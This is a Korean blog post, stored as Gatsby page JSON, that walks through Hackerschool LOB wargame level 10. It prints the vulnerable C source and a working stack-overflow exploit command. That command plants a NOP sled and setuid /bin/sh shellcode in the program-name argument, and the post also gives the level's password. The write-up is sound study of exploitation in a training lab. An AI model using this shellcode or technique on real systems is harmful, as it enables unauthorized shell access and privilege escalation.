{"componentChunkName":"component---src-templates-post-template-tsx","path":"/221029/","result":{"data":{"allMarkdownRemark":{"edges":[{"node":{"html":"<h3>0. 들어가기 전에</h3>\n<p>LOB 레벨 11부터는 꽤 어려운(리버스 쉘 응용 등) 문제들이 나오는걸로 알고 있다. 혼자 열심히 해보고 안되면 빠르게 다른 분들의 포스트를 참고하려고 한다.</p>\n<p>pwn을 완전 주력으로 삼을지는 아직 고민 중이다… 웹해킹도 하고있고 네트워크도 하고있으니 (암호학은 내년에 학교에서 정보보안 고급 암호학 한 번 들어보련다)</p>\n<p>일단 다 해보고 맞는쪽으로 깊게 더 공부해보려고 한다. 아마 웹이나 네트워크가 되지 않을까?</p>\n<h3>1. Level 10 : Vampire -> Skeleton</h3>\n<p>코드를 확인해보자.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">\r\n#include &lt;stdio.h>\r\n#include &lt;stdlib.h>\r\n\r\nextern char **environ;\r\n\r\nmain(int argc, char *argv[])\r\n{\r\n        char buffer[40];\r\n        int i, saved_argc;\r\n\r\n        if(argc &lt; 2){\r\n                printf(\"argv error\\n\");\r\n                exit(0);\r\n        }\r\n\r\n        // egghunter\r\n        for(i=0; environ[i]; i++)\r\n                memset(environ[i], 0, strlen(environ[i]));\r\n\r\n        if(argv[1][47] != '\\xbf')\r\n        {\r\n                printf(\"stack is still your friend.\\n\");\r\n                exit(0);\r\n        }\r\n\r\n        // check the length of argument\r\n        if(strlen(argv[1]) > 48){\r\n                printf(\"argument is too long!\\n\");\r\n                exit(0);\r\n        }\r\n\r\n        // argc saver\r\n        saved_argc = argc;\r\n\r\n        strcpy(buffer, argv[1]);\r\n        printf(\"%s\\n\", buffer);\r\n\r\n        // buffer hunter\r\n        memset(buffer, 0, 40);\r\n\r\n        // ultra argv hunter! 모든 argc를 초기화한다. 그럼 그냥 파일 이름에 담으면 될 것 같다.\r\n        for(i=0; i&lt;saved_argc; i++)\r\n                memset(argv[i], 0, strlen(argv[i]));\r\n}\r\n</code></pre></div>\n<p>여기서 확인할 수 있는건, 우리의 환경변수가 모두 초기화된다는 점이다. 잠깐 다시 한 번 코드의 실행 흐름을 짚어보자.</p>\n<ol>\n<li>함수 프롤로그 실행</li>\n<li>함수 동작 실행</li>\n</ol>\n<ul>\n<li>우리에게 buffer 값을 입력받음</li>\n<li>우리는 이를 이용해서 오버플로우로 ret값을 변환시킴</li>\n<li>기타 다른 동작 실행</li>\n</ul>\n<ol start=\"3\">\n<li>이번에 새로 추가된 ultra hunter가 argv (버퍼 포함) 값들을 전부 초기화시킴.</li>\n<li>변조된 ret값의 주소로 함수가 회귀함</li>\n</ol>\n<p>일단 나는 argv[0]까지 (파일 이름) 초기화된다는 점에 조금 의혹이 간다. argv[0]는 초기화되지 않는게 보통이니까, 일단 argv[0], 즉 파일 이름에 NOP SLED를 걸도록 하자.</p>\n<p>그렇다면 할 일은 나왔다. ret의 값을 argv[0]으로 향하게 하고, argv[0]에 NOP SLED를 이용하여 쉘 코드를 넣으면 될 것 같다.</p>\n<p>대충 확인해본 NOP SLED 중간값의 주소는 다음과 같았다.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">0xbffffb28</code></pre></div>\n<p>그럼 이제</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">./`python -c \"print '\\x90'*44 + '\\xc8\\xfb\\xff\\xbf'\"` `python -c \"print '\\x90' * 200 + '\\x31\\xc0\\xb0\\x31\\xcd\\x80\\x89\\xc3\\x89\\xc1\\x31\\xc0\\xb0\\x46\\xcd\\x80\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\x31\\xd2\\xb0\\x0b\\xcd\\x80'\"` `python -c 'print \"A\"*44 + \"\\x28\\xfb\\xff\\xbf\"'`</code></pre></div>\n<p>비밀번호 : shellcoder</p>\n<hr>\n<h2>Source</h2>\n<ul>\n<li>해커스쿨 FTZ</li>\n<li>Me!</li>\n</ul>","frontmatter":{"title":"FTZ LOB LEVEL 10","summary":"","date":"2022.10.29.","before":"2022.10.28.","after":"2022.10.30.","categories":["C-SEC","KOR","PWN"],"thumbnail":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","placeholder":{"fallback":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAAsTAAALEwEAmpwYAAABhklEQVR42mMwxgFMsAE0NQyY2gzBwMDAQB8M9PT0IGwgiVOzqQkIGRkZ2YCAtZOTg6uri6urq6enB4Tt6ORkamJiilWzhoGRliFQr1FpaVlWWn5WWkF9bWNLS1N2bmFKWsHEiZNKS0sMTUxV9QyN0DQbGBlnuZrHOJjrGBiZW5iGZVhE5pu5eJvr6Jj4uBsVp+pZWZoZGJt6W5uWeFhYmBpDDGAAOlXLwCje0fx/pevzbLtwb09Xb9eq9cpdp5Qj8k08XIKOrlD5/0S2q8LA0S3oWLLd/1q3Tn8rdX0joEYGYAjqGhr72pg+zXE8lmjj5uho72RbuFC1ZptSaIaJpZnb4m71D0dlchONzGxcF4dbfy9yynOzANoH0gyKFWNjPUNjS1NQgOkaGAID2MXTNiTS28BIV1dX39DINMDfW0fXEBjcQNfamJkAFaP4GajfCBa9wHiysrSKj40PDg4JDQuNjIwICQkFxhMkno2MjE3wxDNIBUiNkYkpNG0AjUMkHvyJhHgAACB5pDYwJ+QuAAAAAElFTkSuQmCC"},"images":{"fallback":{"src":"/static/cbbf1da5aea824ae495a6410873b66eb/1c771/Algorithm.png","srcSet":"/static/cbbf1da5aea824ae495a6410873b66eb/deefd/Algorithm.png 75w,\n/static/cbbf1da5aea824ae495a6410873b66eb/292ee/Algorithm.png 150w,\n/static/cbbf1da5aea824ae495a6410873b66eb/1c771/Algorithm.png 299w","sizes":"(min-width: 299px) 299px, 100vw"},"sources":[{"srcSet":"/static/cbbf1da5aea824ae495a6410873b66eb/0e611/Algorithm.webp 75w,\n/static/cbbf1da5aea824ae495a6410873b66eb/6958a/Algorithm.webp 150w,\n/static/cbbf1da5aea824ae495a6410873b66eb/2a405/Algorithm.webp 299w","type":"image/webp","sizes":"(min-width: 299px) 299px, 100vw"}]},"width":299,"height":168}},"publicURL":"/static/cbbf1da5aea824ae495a6410873b66eb/Algorithm.png"}}}}]}},"pageContext":{"slug":"/221029/"}},"staticQueryHashes":[],"slicesMap":{}}